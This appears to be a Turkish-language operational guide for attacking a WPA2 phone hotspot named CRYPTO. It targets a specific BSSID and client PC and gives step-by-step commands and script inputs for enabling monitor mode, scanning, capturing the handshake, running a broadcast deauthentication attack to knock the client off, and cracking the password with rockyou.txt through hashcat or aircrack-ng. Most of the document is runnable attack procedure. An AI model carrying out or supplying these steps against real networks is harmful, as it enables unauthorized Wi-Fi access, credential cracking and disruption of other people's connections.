# 🎯 WPA2 Attack Guide - CRYPTO Hotspot

## Hedef Bilgileri
- **ESSID**: CRYPTO
- **BSSID**: 46:41:C9:D8:13:29
- **Kanal**: Otomatik (telefon hotspot)
- **Hedef Cihaz**: "sims" PC

---

## ⚠️ BAŞLAMADAN ÖNCE

### Kontrol Listesi:
1. ✅ CRYPTO telefon hotspot'u **AÇIK** olmalı
2. ✅ "sims" PC **CRYPTO'ya BAĞLI** olmalı
3. ✅ Kali makinesi telefona **YAKIN** olmalı (aynı oda)
4. ✅ Tüm eski işlemleri temizle:
   ```bash
   sudo pkill -9 airodump-ng aireplay-ng
   sudo airmon-ng stop wlan0mon 2>/dev/null || true
   sudo systemctl restart NetworkManager
   ```

---

## 🚀 ADIM ADIM SALDIRI

### ADIM 1: Monitor Mode Kurulumu
```bash
cd /home/kali/Desktop/WPA2-Hunter/scripts
sudo ./01-setup-monitor-mode.sh
```

**Ne yapacaksınız:**
- Interface adı soracak → `wlan0` yazın
- Onay isteyecek → `e` yazın
- Sonunda "Monitor Interface: wlan0mon" göreceksiniz

---

### ADIM 2: Ağ Taraması (CRYPTO'yu Bul)
```bash
sudo ./02-scan-networks.sh
```

**Ne olacak:**
- 30 saniye tarama yapacak
- CRYPTO ağını listede göreceksiniz
- Kanal numarasını not edin (örn: 1, 6, veya 11)

**ÖNEMLİ:** Eğer CRYPTO görünmüyorsa:
- Telefon hotspot'unu kapatıp açın
- Telefonu daha yakına getirin
- Tekrar tarama yapın

---

### ADIM 3: Handshake Yakalama (Terminal 1)
```bash
sudo ./03-capture-handshake.sh
```

**Girmeniz gerekenler:**
- BSSID: `46:41:C9:D8:13:29`
- Kanal: `<ADIM 2'de gördüğünüz kanal>` (örn: 1)
- Dosya adı: `crypto` (veya istediğiniz isim)

**Bu terminal açık kalacak!** Ekranda paketleri göreceksiniz.

---

### ADIM 4: Deauth Saldırısı (Terminal 2 - YENİ TERMINAL)

**Yeni terminal açın** ve şunu çalıştırın:
```bash
cd /home/kali/Desktop/WPA2-Hunter/scripts
sudo ./04-deauth-attack.sh
```

**Girmeniz gerekenler:**
- Yasal sorumluluk: `EVET`
- Kaydedilmiş hedef kullan: `e`
- Saldırı tipi: `2` (broadcast)
- Paket sayısı: `20`

**Ne olacak:**
- "sims" PC'si CRYPTO'dan düşecek
- Tekrar bağlanırken handshake yakalanacak
- Terminal 1'de şunu göreceksiniz: `[ WPA handshake: 46:41:C9:D8:13:29 ]`

---

### ADIM 5: Handshake Kontrolü

Terminal 1'de (handshake yakalama) **sağ üst köşede** şunu arayın:
```
[ WPA handshake: 46:41:C9:D8:13:29 ]
```

**Gördüyseniz:**
- `Ctrl+C` ile durdurun
- ADIM 6'ya geçin

**Görmediyseniz:**
- ADIM 4'ü tekrarlayın (deauth saldırısı)
- 2-3 kez deneyin
- "sims" PC'sinin bağlı olduğundan emin olun

---

### ADIM 6: Parola Kırma
```bash
sudo ./05-crack-password.sh
```

**Girmeniz gerekenler:**
1. CAP dosyası: `../captures/crypto-01.cap`
2. BSSID kullan: `e`
3. Wordlist seçimi: 
   - `1` → Rockyou.txt (14M parola, önerilen)
   - `3` → Crunch (özel wordlist, örn: 8-10 karakter)
4. Kırma yöntemi:
   - `2` → Hashcat (GPU - ÇOK HIZLI, önerilen)
   - `1` → Aircrack-ng (CPU - yavaş)

**Ne olacak:**
- Parola kırma başlayacak
- Eğer parola wordlist'te varsa bulunacak
- Ekranda şöyle göreceksiniz:
  ```
  KEY FOUND! [ parolanız ]
  ```

---

## 🔧 SORUN GİDERME

### CRYPTO ağı görünmüyor
```bash
# Monitor mode'u sıfırla
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
# ADIM 1'den başla
```

### Handshake yakalanmıyor
```bash
# Deauth saldırısını tekrarla
cd /home/kali/Desktop/WPA2-Hunter/scripts
sudo ./04-deauth-attack.sh
# Tip 2, 30-50 paket dene
```

### "sims" PC bağlı değil
- "sims" PC'sini CRYPTO'ya manuel bağlayın
- Bağlı olduğundan emin olun
- ADIM 4'ü tekrarlayın

---

## 📝 HIZLI KOMUT ÖZETİ

```bash
# Temizlik
sudo pkill -9 airodump-ng aireplay-ng
sudo airmon-ng stop wlan0mon

# Saldırı
cd /home/kali/Desktop/WPA2-Hunter/scripts
sudo ./01-setup-monitor-mode.sh    # wlan0, e
sudo ./02-scan-networks.sh          # Kanal not et
sudo ./03-capture-handshake.sh      # BSSID, Kanal, dosya adı

# YENİ TERMINAL:
sudo ./04-deauth-attack.sh          # EVET, e, 2, 20

# Handshake yakalandıktan sonra:
sudo ./05-crack-password.sh         # cap dosyası, e, 1, 2
```

---

## ✅ BAŞARI KRİTERLERİ

1. ✅ Monitor mode aktif (wlan0mon)
2. ✅ CRYPTO ağı taramada görünüyor
3. ✅ Handshake yakalandı (ekranda mesaj var)
4. ✅ CAP dosyası oluştu (crypto-01.cap)
5. ✅ Parola kırma başladı

---

**İyi şanslar! 🚀**
